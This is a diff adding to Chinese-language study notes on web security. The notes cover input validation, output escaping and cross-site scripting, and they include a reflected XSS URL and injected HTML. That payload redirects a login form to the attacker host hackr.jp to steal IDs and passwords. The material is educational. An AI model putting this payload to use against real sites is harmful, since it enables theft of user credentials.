@@ -21,7 +21,7 @@
 
 > 以服务器为目标的主动攻击
 
-具有代表性的攻击时SQL注入攻击和OS命令注入攻击
+具有代表性的攻击是<b>SQL注入攻击和OS命令注入攻击</b>
 ```
         1执行攻击代码
 攻击者---------------------- 服务器
@@ -32,7 +32,7 @@
 
 > 以服务器为目标的被动攻击
 
-具有代表性的是跨站脚本攻击和跨站点请求伪造；
+具有代表性的是<b>跨站脚本攻击和跨站点请求伪造</b>；
 
 常用的攻击模式如下：
 1. 攻击者诱使用户触发已设置好的陷阱，而陷阱会启动发送已嵌入攻击代码的http请求；
@@ -63,10 +63,112 @@
 
 > 客户端验证
 
+保留客户端验证只是为了尽早的辨识输入错误，起到提高ui体验的作用，
+
 > web应用端（服务端）验证
  
-  * 输入值验证
-  * 输出值转义
+  * 输入值验证：通常是指检查是否是符合系统业务逻辑的数值或检查字符编码等预防对策
+  * 输出值转义：从数据库或文件系统/html/邮件等输出web应用处理的数据之际，针对输出做值转义处理是一项至关重要的安全策略，当输出值转义不完全时，会因触发攻击者传入的攻击代码，而给输出对象带来损害；
+  
+  
+1. 跨站脚本攻击（Cross-Site Scripting Xss）
+
+是指通过存在安全漏洞的web网站注册用户的浏览器内运行非法的html标签或者js代码进行的一种攻击；
+影响如下：
+
+* 利用虚假输入表单骗取用户个人信息
+* 利用脚本窃取用户的cookie值，被害者在不知情的情况下，帮助攻击者发生恶意请求
+* 显示伪造的文章或图片
+
+> 跨站脚本攻击案例
+
+a: 在动态生成html处发生，以编辑个人信息为例子：
+
+```
+正常情况下：
+姓名：________
+邮箱：________
+简介：________
+
+    确认修改
+
+在确认后将编辑的内容正常展示，<b>异常情况下</b>但是当输入的姓名带有html标签或者利用js会造成更严重的后果
+比如将姓名输入为：<s>显示的内容将会带有下划线</s>
+
+这里虽然不会造成太严重的后果，但是利用js可以
+
+```
+
+b: XSS是攻击者利用预先设置的陷阱触发的被动攻击
+
+当网站通过地址栏中的URI的查询字段指定ID，即相当于在表单内自动填写字符串的功能；而在这个地方，隐藏着可执行跨站脚本攻击的漏洞；
+
+```
+http://example.js/login?ID=yama
+
+某登陆网站：
+ID: yama
+PW:_____
+
+攻击者会据此创建下面这段嵌入恶意代码的url；隐藏植入事先准备好的欺诈邮件中或者web页面内；诱使用户去点击该url；
+
+http://example.js/login?ID="><script>var+f=document.getElementById("login"); +f.action="http://hackr.jp/pwget";+f.method=>"get";</script><span+s="
+浏览器打开该uri后，直观感觉没有发生任何变化；但是设置好的脚本已经开发运行了；当用户输入id和pw后就会直接发送到攻击者的网站（即hackr.jp），导致个人登陆信息被窃取；
+两种方式请求是对应的html源代码如下：
+```
+```
+<div class="logo">
+  <img src="/img/logo.png" alt="某网站">
+</div>
+<form action="http://example.jp/login" method="post" id="login">
+  <div class="input_id">
+    ID  <input type="text" name="ID" value="yama">
+  </div>
+</form>
+
+<!-- 被嵌入攻击代码后 -->
+<div class="logo">
+  <img src="/img/logo.png" alt="某网站">
+</div>
+<form action="http://example.jp/login" method="post" id="login">
+  <div class="input_id">
+    ID  <input type="text" name="ID" value=""><script>var f=document.getElementById("login"); f.action="http://hackr.jp/pwget"; f.method="get";</script><span s="" />
+  </div>
+</form>
+```
+
+> 对用户cookie的窃取攻击
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
 
 
 
